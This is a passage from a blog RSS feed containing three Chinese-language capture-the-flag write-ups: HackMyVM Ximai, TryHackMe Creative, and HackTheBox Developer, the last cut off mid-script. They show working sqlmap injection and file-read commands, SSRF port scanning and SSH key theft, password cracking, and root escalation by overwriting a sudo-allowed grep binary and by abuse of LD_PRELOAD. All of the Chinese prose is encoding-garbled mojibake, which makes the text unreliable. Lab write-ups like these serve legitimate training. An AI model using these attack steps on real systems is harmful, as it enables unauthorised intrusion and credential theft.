Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.57 ms 192.168.56.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
```

è®¿é—® `HTTP` ï¼Œ`80`ç«¯å£æ˜¯é»˜è®¤é¡µé¢

![image.png](/post-images/HackMyVMXimai/image1.png)

`8080`ç«¯å£æ˜¯`wordpress`ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸€ä¸ªä¿¡æ¯

![image.png](/post-images/HackMyVMXimai/image2.png)

ä¿¡æ¯æ˜¯ï¼š

![image.png](/post-images/HackMyVMXimai/image3.png)

`80`ç«¯å£æ‰«æä¸€ä¸‹ç›®å½•ï¼Œ`8000`ç«¯å£ç›´æ¥ä¸Š`WPScan`

```bash
âœ  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.62
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, zip, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1022l     5262w    85827c http://192.168.56.62/info.php
[>-------------------] - 1s      1233/882208  39m     found:1       errors:2      
[>-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                
200      GET      376l      965w    10938c http://192.168.56.62/
200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg
200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt
[####################] - 6m    882228/882228  0s      found:5       errors:2      
[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ 
[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ => Directory listing (add --scan-dir-listings to scan)  
```

ä¸‹é¢æ˜¯`80`ç«¯å£ä¸­æ‰«æå‡ºæ¥çš„é¡µé¢

![image.png](/post-images/HackMyVMXimai/image4.png)

(?è¯´æˆ‘å—ğŸ˜­)

![image.png](/post-images/HackMyVMXimai/image5.png)

è¿™ä¸ª`creds.txt`å¯èƒ½è¿˜æœ‰ç‚¹ç”¨ï¼Œå› ä¸º`mysqli.allow_local_infile`ä¹Ÿå¼€å¯ç€ï¼Œå¯ä»¥é€šè¿‡æ•°æ®åº“å»è¯»

![image.png](/post-images/HackMyVMXimai/image6.png)

æ¥ä¸‹æ¥çœ‹`Wpscan` çš„ç»“æœï¼Œæ‰«æåˆ°å­˜åœ¨ `SQL`æ³¨å…¥ï¼Œ`CVE-2025-2011`

![image.png](/post-images/HackMyVMXimai/image7.png)

## CVE-2025-2011

POCï¼šhttps://github.com/datagoboom/CVE-2025-2011

ä½†æ˜¯è¿™é‡Œé€šè¿‡`POC`æ— æ³•è¿›è¡Œåˆ©ç”¨

![image.png](/post-images/HackMyVMXimai/image8.png)

æˆ‘ä»¬è§‚å¯Ÿ`POC`ï¼Œå°è¯•ä½¿ç”¨`SQLmap`æ¥æ‰«

![image.png](/post-images/HackMyVMXimai/image9.png)

```bash
sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index" -batch  
```

![image.png](/post-images/HackMyVMXimai/image10.png)

è¿™æ ·å°±å¯ä»¥æ‰«æå‡ºæ¥äº†ï¼Œæˆ‘ä»¬æ ¹æ®å‰é¢çš„çº¿ç´¢æ¥ç›´æ¥è¯»å–æ–‡ä»¶ `/etc/jimmy.txt`

```bash
sqlmap -u "http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index" -batch --file-read /etc/jimmy.txt
```

```bash
âœ  files cat _etc_jimmy.txt 
HandsomeHU
```

`ssh` ç™»å½•

![image.png](/post-images/HackMyVMXimai/image11.png)

## æƒé™æå‡

å½“å¤´ä¸€æ£’

```bash
jimmy@Ximai:~$ ls
sorry, you are restricted from using this command.
```

æŸ¥çœ‹ç¯å¢ƒå˜é‡

```bash
jimmy@Ximai:~$ echo $PATH
./...
```

ç›´æ¥æ¢å¤ä¸€ä¸‹ç¯å¢ƒå˜é‡å°±è¡Œäº†

```bash
jimmy@Ximai:~$ export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
```

å½“å‰ç›®å½•ä¸‹èƒ½è¯»å–`user.txt`

```bash
jimmy@Ximai:~$ cat us3r.txt 
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```

æŸ¥çœ‹`sudo`æƒé™

```bash
jimmy@Ximai:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on Ximai.
```

æŸ¥çœ‹`wp-config.php`

```bash
/** Database username */
define( 'DB_USER', 'root' );       
                                                                                                
/** Database password */                                                                        
define( 'DB_PASSWORD', 'SuperSecret' ); 
```

æ•°æ®åº“è¡¨ä¿¡æ¯

```bash
MariaDB [wordpress]> select * from wp_users;
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | adminer    | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |
+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```

å°è¯•å¯†ç çˆ†ç ´ï¼Œè¿™é‡Œä½¿ç”¨`rockyou`æ— æ³•çˆ†ç ´å‡ºæ¥ï¼Œå¤ªæ…¢äº†

```bash
âœ  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

ä½¿ç”¨`cupp`ç”Ÿæˆå¼±å¯†ç å­—å…¸è¿›è¡Œå°è¯•

![image.png](/post-images/HackMyVMXimai/image12.png)

ä¹Ÿä¸èƒ½ç ´è§£ï¼Œæˆ‘ä»¬é€šè¿‡`top 100`åŠ ä¸Šç”¨æˆ·ååˆ¶ä½œå­—å…¸

```bash
âœ  Ximia cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk '{print "adminer"$1}' > maybe.txt
```

å¾—åˆ°å¯†ç  `adminer123456`

![image.png](/post-images/HackMyVMXimai/image13.png)

æŸ¥çœ‹ `sudo` æƒé™

```bash
adminer@Ximai:~$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

```bash
adminer@Ximai:~$ sudo /usr/bin/grep 
sorry, you are restricted from using this command.try egrep instead.
```

666å­—ç¬¦ä¸²

```bash
adminer@Ximai:~$ cat /usr/bin/grep
echo 'sorry, you are restricted from using this command.try egrep instead.'
```

æŸ¥çœ‹æƒé™ï¼Œæœ‰å†™å…¥æƒé™

```bash
adminer@Ximai:~$ ls -al /usr/bin/grep
-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep
```

ç›´æ¥æ¢­å“ˆ

```bash
adminer@Ximai:~$ cat /bin/bash > /usr/bin/grep
adminer@Ximai:~$ sudo grep
root@Ximai:/home/adminer# 
```

è¯»å– `root.txt`

```bash
root@Ximai:~# cat r00t.txt 
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>WordPress</category>
            <category>CVE-2025-2011</category>
            <category>Password_generator</category>
        </item>
        <item>
            <title><![CDATA[TryHackMe - Creative]]></title>
            <link>https://www.sunsetaction.top/2025/07/05/TryHackMeCreative</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/05/TryHackMeCreative</guid>
            <pubDate>Sat, 05 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Creative https://tryhackme.com/room/creative | Easy infoï¼šExploit a vulnerable web application and some misconfigurations to gain root privileges. Reco...]]></description>
            <content:encoded><![CDATA[
# Creative

> https://tryhackme.com/room/creative | `Easy`
> 

infoï¼šExploit a vulnerable web application and some misconfigurations to gain root privileges.

![image.png](/post-images/TryHackMeCreative/image.png)

## Recon

```bash
âœ  Creative nmap -sT -min-rate 10000 10.10.96.159             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:02 CST
Nmap scan report for 10.10.96.159
Host is up (0.35s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds
```

```bash
âœ  Creative nmap -sT -A -p 22,80 10.10.96.159                                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:03 CST
Nmap scan report for 10.10.96.159
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:ff:e3:db:ba:78:82:20:fc:2c:97:dc:21:21:7e:ad (RSA)
|   256 89:7a:de:66:81:14:cd:ea:a8:46:a4:57:31:d8:d2:cf (ECDSA)
|_  256 07:78:87:81:7b:69:a7:d2:8b:5d:45:79:5d:85:cd:ca (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   216.65 ms 10.2.0.1
2   ... 3
4   343.32 ms 10.10.96.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.57 seconds
```

è®¿é—®`HTTP`

![image.png](/post-images/TryHackMeCreative/image1.png)

ç»è¿‡ä¸€ç•ªæœç´¢æ²¡æ³•å‘ç°å¯ä»¥åˆ©ç”¨çš„ï¼Œæ‰«æä¸€ä¸‹å­åŸŸå

```bash
âœ  Creative ffuf -u 'http://creative.thm' -H 'host: FUZZ.creative.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs=178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 374ms]
:: Progress: [14512/114442] :: Job [1/1] :: 117 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

å¾—åˆ°`beta`ï¼Œè®¿é—®

![image.png](/post-images/TryHackMeCreative/image2.png)

## SSRF

çœ‹ç€åƒæ˜¯`SSRF`ï¼Œè¾“å…¥æˆ‘ä»¬`IP`å°è¯•

```bash
âœ  Creative nc -lvp 80  
listening on [any] 80 ...
connect to [10.2.7.57] from creative.thm [10.10.96.159] 33820
GET / HTTP/1.1
Host: 10.2.7.57
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

è¾“å…¥`127.0.0.1`

![image.png](/post-images/TryHackMeCreative/image3.png)

ç›´æ¥çˆ†ç«¯å£

```bash
âœ  Creative seq 2000 > ports
```

```bash
âœ  Creative ffuf -u 'http://beta.creative.thm' -X POST -d 'url=http://127.0.0.1:FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ports -fs=13

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm
 :: Wordlist         : FUZZ: /root/Desktop/TryHackMe/Creative/ports
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 365ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 348ms]
:: Progress: [2000/2000] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

å‘ç°å†…éƒ¨ç«¯å£`1337` ï¼Œç›´æ¥è®©æœåŠ¡å™¨è¿›è¡Œ`SSRF`

![image.png](/post-images/TryHackMeCreative/image4.png)

æˆ‘ä»¬å†æ¢æˆ

```bash
http://127.0.0.1:1337/home
```

![image.png](/post-images/TryHackMeCreative/image5.png)

æˆ‘ä»¬ç›´æ¥è¯»å–ç§é’¥

```bash
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```

![image.png](/post-images/TryHackMeCreative/image6.png)

## Crack

ç›´æ¥ç§é’¥ç™»å½•

```bash
âœ  Creative ssh saad@10.10.96.159 -i sshkey
Enter passphrase for key 'sshkey': 
```

éœ€è¦å¯†ç ï¼Œçˆ†ç ´

```bash
âœ  Creative john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (sshkey)     
1g 0:00:00:31 DONE (2025-07-05 22:40) 0.03192g/s 30.65p/s 30.65c/s 30.65C/s hawaii..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

æˆ‘ä»¬å†ç™»å½•

![image.png](/post-images/TryHackMeCreative/image7.png)

å½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹èƒ½è¯»å–åˆ°`user.txt`

```bash
saad@ip-10-10-96-159:~$ cat user.txt 
9a1ce90a7653d74ab98630b47b8b4a84
```

## Root

çœ‹åˆ°`gnupg` æ„Ÿè§‰æ˜¯è¦æ•´è¿™ä¸ª

```bash
saad@ip-10-10-96-159:~$ ls -al
total 52
drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
drwxr-xr-x 4 root root 4096 Jul  5 13:57 ..
-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad 4096 Jan 20  2023 .cache
drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
drwx------ 3 saad saad 4096 Jan 20  2023 snap
drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
```

ä½†æ˜¯å¹¶ä¸æ˜¯ï¼Œå› ä¸ºæ–‡ä»¶å¹¶ä¸è¶³å¤Ÿ

æˆ‘ä»¬åˆæ³¨æ„åˆ°`.bash_history` ç«Ÿç„¶æ²¡æœ‰è¢«é‡åˆå‘åˆ°`/dev/null`

```bash
saad@ip-10-10-96-159:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
```

å¾—åˆ°å¯†ç  `MyStrongestPasswordYet$4291` ï¼Œå•¥çœ‹`sudo`æƒé™

```bash
saad@ip-10-10-96-159:~$ sudo -l
Matching Defaults entries for saad on ip-10-10-96-159:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-96-159:
    (root) /usr/bin/ping
```

çœ‹åˆ°`env_keep+=LD_PRELOAD` ç»“æŸäº†

- `LD_PRELOAD` å¯ä»¥åœ¨è¿è¡Œç¨‹åºå‰å¼ºè¡ŒåŠ è½½ä½ è‡ªå®šä¹‰çš„ `.so` å…±äº«åº“ã€‚
- å¦‚æœè¿™ä¸ªåº“ä¸­å®ç°äº† `getuid()` æˆ–å…¶ä»–æ ‡å‡†å‡½æ•°ï¼Œå®ƒå°±å¯ä»¥è¢«ä¼˜å…ˆåŠ è½½ã€è¦†ç›–ã€‚
- å½“ä½ ä»¥ `sudo` è¿è¡Œ `/bin/whoami`ï¼Œå°±ä¼šå…ˆåŠ è½½ä½ çš„åº“ï¼Œæ‰§è¡Œä½ æŒ‡å®šçš„æ¶æ„ä»£ç 

> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path
> 

![image.png](/post-images/TryHackMeCreative/image8.png)

`root.txt`

```bash
root@ip-10-10-96-159:~# cat root.txt 
992bfd94b90da48634aed182aae7b99f
```

## æ€»ç»“

æ¢­å“ˆ]]></content:encoded>
            <category>é¶æœº</category>
            <category>TryHackMe</category>
            <category>Linux</category>
            <category>SSRF</category>
            <category>SUDO</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Developer]]></title>
            <link>https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer</guid>
            <pubDate>Sun, 22 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Developer https://app.hackthebox.com/machines/Developer | Linux | Hard Recon è®¿é—® HTTP å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· sunset ï¼Œåˆ›å»ºå®Œæ¯•åä¼šç›´æ¥è¿›å…¥åå° é‡Œé¢ä¼šæœ‰ä¸€äº›CTFé¢˜ï¼Ÿè®©ä½ åšï¼Ÿ CTF PE...]]></description>
            <content:encoded><![CDATA[
# Machine - Developer

> https://app.hackthebox.com/machines/Developer | `Linux`Â |Â `Hard`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image.png)

## Recon

```bash
âœ  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST 
Nmap scan report for 10.10.11.103
Host is up (0.092s latency).
Not shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 110.48 seconds
```

```bash
âœ  Developer nmap -sT -A -p 22,80 10.10.11.103       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST
Nmap scan report for 10.10.11.103
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://developer.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   99.02 ms 10.10.16.1
2   99.78 ms 10.10.11.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.70 seconds
```

è®¿é—® `HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image1.png)

å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· `sunset` ï¼Œåˆ›å»ºå®Œæ¯•åä¼šç›´æ¥è¿›å…¥åå°

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image2.png)

é‡Œé¢ä¼šæœ‰ä¸€äº›CTFé¢˜ï¼Ÿè®©ä½ åšï¼Ÿ

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image3.png)

## CTF

### PES

 é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ª`EXE`æ–‡ä»¶åˆä¸€ä¸²åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼š`X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC`

å¯¹ç¨‹åºè¿›è¡Œåç¼–è¯‘ï¼Œåœ¨`PS2EXE`ä¸­çš„`Main`ä¸­èƒ½æ‰¾åˆ°ä¸€ä¸²`base64`ç¼–ç åçš„å­—ç¬¦ä¸²

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image4.png)

è§£ç åæ˜¯åŠ å¯†çš„é€»è¾‘ï¼Œé€šè¿‡`AI`å†™å‡ºè§£å¯†è„šæœ¬å³å¯

```bash
# ===================================================================
# Decryption Script for FullCrypto
# We are reversing the logic from the original Encrypt-String function
# ===================================================================

# åŠ è½½å¿…è¦çš„ç¨‹åºé›†
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Security")
Add-Type -AssemblyName System.Security

function Decrypt-String($base64String) {
    # --- è¿™äº›æ˜¯æˆ‘ä»¬åœ¨åŸè„šæœ¬ä¸­æ‰¾åˆ°çš„ç¡¬ç¼–ç ç§˜å¯† ---
    $Passphrase = "AmazinglyStrongPassword"
    $salt       = "CrazilySimpleSalt"
    $init       = "StupidlyEasy_IV"
    # ----------------------------------------------

    # 1. å‡†å¤‡ Rijndael (AES) å¯¹è±¡
    $r = New-Object System.Security.Cryptography.RijndaelManaged

    # 2. å‡†å¤‡å¯†ç å’Œç›å€¼çš„å­—èŠ‚æ•°ç»„ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)
    $passBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
    $saltBytes = [System.Text.Encoding]::UTF8.GetBytes($salt)

    # 3. ç”Ÿæˆå¯†é’¥ (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)
    # ä½¿ç”¨ PasswordDeriveBytes, SHA1, 5æ¬¡è¿­ä»£, ç”Ÿæˆ32å­—èŠ‚å¯†é’¥
    $r.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes $passBytes, $saltBytes, "SHA1", 5).GetBytes(32)

    # 4. ç”Ÿæˆ IV (å¿…é¡»å’ŒåŠ å¯†æ—¶å®Œå…¨ä¸€æ ·)
    # è®¡ç®— IV ç§å­çš„ SHA1 å“ˆå¸Œï¼Œå¹¶å–å‰16ä¸ªå­—èŠ‚
    $r.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($init))[0..15]

    # 5. ä» Base64 å­—ç¬¦ä¸²è§£ç å‡ºåŠ å¯†åçš„å­—èŠ‚æ•°ç»„
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($base64String)
    } catch {
        Write-Error "Invalid Base64 string. Cannot decrypt."
        return
    }

    # 6. åˆ›å»ºè§£å¯†å™¨å¹¶æ‰§è¡Œè§£å¯†
    $c = $r.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream @(,$encryptedBytes)
    $cs = New-Object System.Security.Cryptography.CryptoStream $ms, $c, "Read"
    $sr = New-Object System.IO.StreamReader $cs

    # 7. è¯»å–è§£å¯†åçš„æ˜æ–‡
    $decryptedString = $sr.ReadToEnd()

    # 8. æ¸…ç†èµ„æºå¹¶è¿”å›ç»“æœ
    $sr.Close()
    $cs.Close()
    $ms.Close()
    $r.Clear()

    return $decryptedString
}

# --- ä½¿ç”¨æ–¹æ³• ---
# å°†ä½ åœ¨æŒ‘æˆ˜ä¸­å¾—åˆ°çš„åŠ å¯†å­—ç¬¦ä¸²æ›¿æ¢åˆ°ä¸‹é¢çš„å˜é‡ä¸­
$encryptedData = "è¿™é‡Œæ”¾ä½ è¦è§£å¯†çš„Base64å­—ç¬¦ä¸²"

# è°ƒç”¨è§£å¯†å‡½æ•°
$decryptedResult = Decrypt-String -base64String $encryptedData

